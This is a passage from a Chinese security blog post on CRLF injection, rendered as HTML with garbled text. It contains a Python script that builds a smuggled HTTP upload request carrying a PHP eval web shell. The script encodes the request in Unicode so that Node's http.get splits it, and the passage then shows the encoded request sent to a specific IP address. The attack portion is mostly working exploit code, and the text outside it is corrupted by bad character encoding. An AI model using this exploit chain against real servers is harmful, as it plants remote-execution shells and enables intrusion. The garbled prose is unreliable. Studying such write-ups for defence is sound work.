class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br><span class="line"></span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\r\n&quot;)</span><br><span class="line"></span><br><span class="line">def payload_encode(raw):</span><br><span class="line">    ret &#x3D; u&quot;&quot;</span><br><span class="line">    for i in raw:</span><br><span class="line">        ret +&#x3D; chr(0x0100+ord(i))</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">payload &#x3D; payload_encode(payload)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
æ„é€ è¯·æ±‚ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº&#39;)</span><br></pre></td></tr></table></figure>
æˆåŠŸå®ç°äº†ç›®æ ‡æœ¬åœ°çš„httpè¯·æ±‚<br><img src="/images/pasted-48.png" alt="upload successful"></li>
</ul>
<hr>
<ul>
<li>å‚è€ƒæ¥æºï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240014">åˆè¯†HTTPå“åº”æ‹†åˆ†æ”»å‡»ï¼ˆCRLF Injectionï¼‰</a></li>
</ul>
</div><div class="tags"></div><div class="post-nav"><a class="pre" href="/2021/05/31/SAST-findbug%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99/">SAST-findbugsè‡ªå®šä¹‰è§„åˆ™</a><a class="next" href="/2021/05/20/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/">drozerå®‰è£…å’Œä½¿ç”¨</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/RCE/" style="font-size: 15px;">RCE</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/05/31/SAST-findbug%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99/">SAST-findbugsè‡ªå®šä¹‰è§„åˆ™</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/25/CRLF%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/">CRLFæ³¨å…¥æµ…æ</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/">drozerå®‰è£…å’Œä½¿ç”¨</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/18/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/">DESåŠ å¯†åŸç†åŠå®ç°</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/16/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">äº¿é‚®é‚®ä»¶ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/16/test/">SSRFæ¼æ´åˆ©ç”¨åŠé˜²æŠ¤</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/">Hessianååºåˆ—åŒ–RCEæ¼æ´</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright Â© 2021 <a href="/." rel="nofollow">æœˆè½èŠ±å¼€.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=1.0.0"><script type="text/javascript" src="/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/love.js"></script><script type="text/javascript" src="/js/copycode.js" successtext="Copy Successed!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>